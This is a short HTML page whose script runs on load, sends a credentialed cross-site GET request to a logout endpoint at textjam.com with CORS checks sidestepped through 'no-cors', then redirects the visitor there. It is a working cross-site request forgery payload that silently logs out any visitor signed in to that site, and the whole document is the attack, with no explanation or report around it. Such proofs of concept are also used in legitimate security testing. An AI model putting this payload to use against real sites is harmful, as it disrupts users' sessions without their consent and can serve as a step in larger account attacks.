<!DOCTYPE html>
<script>
// Auto-execute on page load
fetch('https://textjam.com/api/auth/logout', {
    method: 'GET',
    credentials: 'include',  // Send cookies
    mode: 'no-cors'         // Bypass CORS
}).catch(() => {}); // Ignore errors

// Redirect immediately
setTimeout(() => {
    window.location.href = 'https://textjam.com';
}, 300);
</script>
